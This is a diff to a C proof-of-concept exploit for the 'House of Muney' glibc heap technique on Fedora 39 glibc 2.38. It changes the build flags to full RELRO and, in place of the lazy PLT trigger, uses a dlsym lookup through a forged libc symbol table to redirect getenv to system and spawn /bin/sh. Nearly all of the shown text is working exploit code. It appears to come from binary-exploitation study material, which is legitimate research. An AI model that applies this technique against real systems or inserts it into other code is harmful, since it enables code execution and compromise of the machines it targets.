@@ -4,7 +4,7 @@
  * Runtime : Fedora 39 glibc 2.38, build ID 1cd2d1016ef987f11f5709c2aa0deb4520dcc851
  * Website : https://4xura.com/binex/heap/house-of-muney/
  * Compile : gcc -O0 -Wall -Wextra -Werror -fPIE -pie -pthread \
- *             -fno-builtin-getenv -Wl,-z,lazy \
+ *             -fstack-protector-strong -Wl,-z,relro,-z,now,-z,noexecstack \
  *             -o house_of_muney_glibc-2.38 house_of_muney_glibc-2.38.c
  * Run     : Use the matching Fedora 39 ld-linux-x86-64.so.2 and libc.so.6.
  *           Pipe "echo MUNEY_SHELL_OK; exit" into stdin for a non-interactive check.
@@ -109,11 +109,16 @@ static void *run_exploit(void *unused) {
     if (dynsym[GETENV_INDEX].st_value != GETENV_OFFSET)
         syscall(SYS_exit_group, 5);
     dynsym[GETENV_INDEX].st_value = SYSTEM_OFFSET;
-    printf("[6] getenv@dynsym -> system, triggering getenv@plt('/bin/sh')\n");
+    printf("[6] getenv@dynsym -> system; requesting a fresh lookup\n");
 
-    /* The executable's getenv JUMP_SLOT is still unresolved at this point.
-       Its first call now resolves to system with a pointer argument intact. */
-    getenv("/bin/sh");
+    /* Full RELRO has already resolved the executable's PLT. A fresh dlsym
+       lookup still walks libc's forged GNU hash and symbol table. */
+    void *resolved = dlsym(RTLD_DEFAULT, "getenv");
+    printf("[7] dlsym(getenv)=%p, expected system=%p\n",
+           resolved, (void *)(libc_base + SYSTEM_OFFSET));
+    if ((uintptr_t)resolved != libc_base + SYSTEM_OFFSET)
+        syscall(SYS_exit_group, 6);
+    ((int (*)(const char *))resolved)("/bin/sh");
     syscall(SYS_exit_group, 0);
     __builtin_unreachable();
 }
